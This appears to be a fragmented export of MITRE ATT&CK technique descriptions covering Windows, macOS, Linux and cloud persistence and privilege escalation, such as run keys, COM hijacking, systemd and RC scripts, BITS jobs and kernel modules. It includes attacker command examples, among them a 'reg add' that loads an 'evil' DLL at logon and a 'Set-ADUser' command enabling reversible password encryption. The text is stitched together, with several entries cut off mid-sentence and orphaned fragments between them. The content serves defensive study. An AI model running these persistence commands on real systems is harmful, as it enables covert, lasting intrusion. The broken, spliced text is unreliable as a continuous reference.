        An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021)

        After modifying a binary, an adversary may attempt to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by preventing it from updating (e.g., via the `yum-versionlock` command or `versionlock.list` file in Linux systems that use the yum package manager).(Citation: Google Cloud Mandiant UNC3886 2024)

        Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.

        The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)

        Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.

      description: |-
        Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

      name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
      description: |-
        Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

        The following run keys are created by default on Windows systems:

        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

        Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

        Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

        The following Registry keys can be used to set startup folder items for persistence:

        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
        * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
        * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

        The following Registry keys can control automatic startup of services during boot:

        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

        Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

        Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user.

        By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

        Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.

      description: |-
        Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)

        In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.(Citation: Microsoft Entra ID Service Principals) In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation: GCP Service Accounts) While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.(Citation: AWS Instance Profiles)(Citation: AWS Lambda Execution Role)

        Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.

        Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).

      description: |-
        Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) 

        When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)

        Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)

        Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as "Legacy System Extensions" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)

        Adversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)

        Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)

        An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.

        A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)

        The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.

        ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.

        Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)

      name: Hijack Execution Flow
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

        There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.

        Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.

        For example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host.(Citation: AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)

      description: |-
        Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

        In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

        The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)

        Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)

        Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)

        Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)

      description: "Adversaries may establish persistence through executing malicious
        commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s
        execute several configuration scripts at different points throughout the session
        based on events. For example, when a user opens a command-line interface or
        remotely logs in (such as via SSH) a login shell is initiated. The login shell
        executes scripts from the system (<code>/etc</code>) and the user’s home directory
        (<code>~/</code>) to configure the environment. All login shells on a system
        use /etc/profile when initiated. These configuration scripts run at the permission
        level of their directory and are often used to set environment variables,
        create aliases, and customize the user’s environment. When the shell exits
        or terminates, additional shell scripts are executed to ensure the shell exits
        appropriately. \n\nAdversaries may attempt to establish persistence by inserting
        commands into scripts automatically executed by shells. Using bash as an example,
        the default shell for most GNU/Linux systems, adversaries may add commands
        that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code>
        files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These
        files typically require root permissions to modify and are executed each time
        any shell on a system launches. For user level permissions, adversaries can
        insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>,
        or <code>~/.profile</code> which are sourced when a user opens a command-line
        interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation:
        Linux manual bash invocation) Since the system only executes the first existing
        file in the listed order, adversaries have used <code>~/.bash_profile</code>
        to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code>
        file which is additionally executed if the connection is established remotely
        or an additional interactive shell is opened, such as a new tab in the command-line
        interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation:
        Magento) Some malware targets the termination of a program to trigger execution,
        adversaries can use the <code>~/.bash_logout</code> file to execute malicious
        commands at the end of a session. \n\nFor macOS, the functionality of this
        technique is similar but may leverage zsh, the default shell for macOS 10.15+.
        When the Terminal.app is opened, the application launches a zsh login shell
        and a zsh interactive shell. The login shell configures the system environment
        using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>,
        and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation:
        code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login
        shell then configures the user environment with <code>~/.zprofile</code> and
        <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code>
        to configure the user environment. Upon exiting, <code>/etc/zlogout</code>
        and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes
        <code>/etc/bashrc</code> on startup."

      name: 'Event Triggered Execution: Component Object Model Hijacking'
      description: "Adversaries may establish persistence by executing malicious content
        triggered by hijacked references to Component Object Model (COM) objects.
        COM is a system within Windows to enable interaction between software components
        through the operating system.(Citation: Microsoft Component Object Model)
        \ References to various COM objects are stored in the Registry. \n\nAdversaries
        may use the COM system to insert malicious code that can be executed in place
        of legitimate software through hijacking the COM references and relationships
        as a means for persistence. Hijacking a COM object requires a change in the
        Registry to replace a reference to a legitimate system component which may
        cause that component to not work when executed. When that system component
        is executed through normal system operation the adversary's code will be executed
        instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects
        that are used frequently enough to maintain a consistent level of persistence,
        but are unlikely to break noticeable functionality within the system as to
        avoid system instability that could lead to detection. \n\nOne variation of
        COM hijacking involves abusing Type Libraries (TypeLibs), which provide metadata
        about COM objects, such as their interfaces and methods. Adversaries may modify
        Registry keys associated with TypeLibs to redirect legitimate COM object functionality
        to malicious scripts or payloads. Unlike traditional COM hijacking, which
        commonly uses local DLLs, this variation may leverage the \"script:\" moniker
        to execute remote scripts hosted on external servers.(Citation: RELIAQUEST)
        This approach enables stealthy execution of code while maintaining persistence,
        as the remote payload would be automatically downloaded whenever the hijacked
        COM object is accessed."

        Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)

        Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)

      name: 'Hijack Execution Flow: Path Interception by Unquoted Path'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

        Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>"C:\safe path with space\program.exe"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)

        This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.

        is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)),

        is an open standard that allows users to authorize applications to access

        adversaries to persist in an environment – for example, by granting consent
        to an application from a high-privileged adversary-controlled account in order
        to maintain access to its data, even in the event of losing access to the
        account.(Citation: Wiz Midnight Blizzard 2024)(Citation: Microsoft Malicious

        CVE 2024)\n\nPath configuration files are designed to extend Python’s module
        search paths through the use of import statements. If a `.pth` file is placed
        in Python's `site-packages` or `dist-packages` directories, any lines beginning
        with `import` will be executed automatically on Python invocation.(Citation:
        DFIR Python Persistence 2025) Similarly, if `sitecustomize.py` or `usercustomize.py`
        is present in the Python path, these files will be imported during interpreter
        startup, and any code they contain will be executed.(Citation: Python Site
        Configuration Hook)\n\nAdversaries may abuse these mechanisms to establish
        persistence on systems where Python is widely used (e.g., for automation or

        Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

        The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)

        Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)

        BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)

      description: |-
        Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.

        The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:

        * <code>SCRNSAVE.exe</code> - set to malicious PE path
        * <code>ScreenSaveActive</code> - set to '1' to enable the screensaver
        * <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock
        * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed

        Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)

      description: "Adversaries may disable or modify conditional access policies
        to enable persistent access to compromised accounts. Conditional access policies
        are additional verifications used by identity providers and identity and access
        management systems to determine whether a user should be granted access to
        a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be
        denied access to applications based on their IP address, device enrollment
        status, and use of multi-factor authentication.(Citation: Microsoft Conditional
        Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional
        Access Policies) In some cases, identity providers may also support the use
        of risk-based metrics to deny sign-ins based on a variety of indicators. In
        AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary
        constraints such as the source IP, the date the request was made, and the
        nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation:
        GCP IAM Conditions) These measures help to prevent compromised credentials
        from resulting in unauthorized access to data or resources, as well as limit

      name: Reversible Encryption
      description: |-
        An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)

        If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:

        1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>
        2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>
        3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)
        4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)

        With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)

        An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to "Windows Server 2008" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.

        Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)

        Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)

        Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.

        For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.(Citation: Microsoft Installation Procedures)

        Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.

        Adversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.

        Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence across reboots.(Citation: Juniper Networks ESXi Backdoor 2022)

        Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd.(Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)

      description: "Adversaries may create or modify systemd services to repeatedly
        execute malicious payloads as part of persistence. Systemd is a system and
        service manager commonly used for managing background daemon processes (also
        known as services) and other system resources.(Citation: Linux man-pages:
        systemd January 2014) Systemd is the default initialization (init) system
        on many Linux distributions replacing legacy init systems, including SysVinit
        and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit
        configuration files with the `.service` file extension to encode information
        about a service's process. By default, system level unit files are stored
        in the `/systemd/system` directory of the root owned directories (`/`). User
        level unit files are stored in the `/systemd/user` directories of the user
        owned directories (`$HOME`).(Citation: lambert systemd 2022) \n\nInside the
        `.service` unit files, the following directives are used to execute commands:(Citation:
        freedesktop systemd.service)  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost`
        directives execute when a service is started manually by `systemctl` or on
        system start if the service is set to automatically start.\n* `ExecReload`
        directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`,
        and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries
        have created new service files, altered the commands a `.service` file’s directive
        executes, and modified the user directive a `.service` file executes as, which
        could result in privilege escalation. Adversaries may also place symbolic
        links in these directories, enabling systemd to find these payloads regardless
        of where they reside on the filesystem.(Citation: Anomali Rocke March 2019)(Citation:
        airwalk backdoor unix systems)(Citation: Rapid7 Service Persistence 22JUNE2016)
        \n\nThe `.service` file’s User directive can be used to run service as a specific
        user, which could result in privilege escalation based on specific user/group
        permissions. \n\nSystemd services can be created via systemd generators, which
        support the dynamic generation of unit files. Systemd generators are small
        executables that run during boot or configuration reloads to dynamically create
        or modify systemd unit files by converting non-native configurations into
        services, symlinks, or drop-ins (i.e., [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)).(Citation:

        maintain persistence by “closing the door” behind them  – in other words,
        by preventing other threat actors from initially accessing or maintaining
        a foothold on the same system. \n\nFor example, adversaries may patch a vulnerable,
        compromised system(Citation: Mandiant-iab-control)(Citation: CERT AT Fortinent
        Ransomware 2025) to prevent other threat actors from leveraging that vulnerability
        in the future. They may “close the door” in other ways, such as disabling

        other threat actors may allow an adversary to maintain sole access to a compromised

        with or even being removed themselves by other threat actors. It also reduces
        the “noise” in the environment, lowering the possibility of being caught and
        evicted by defenders. Finally, in the case of [Resource Hijacking](https://attack.mitre.org/techniques/T1496),

        Adversaries may create an account to maintain access to victim systems.(Citation: Symantec WastedLocker June 2020) With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

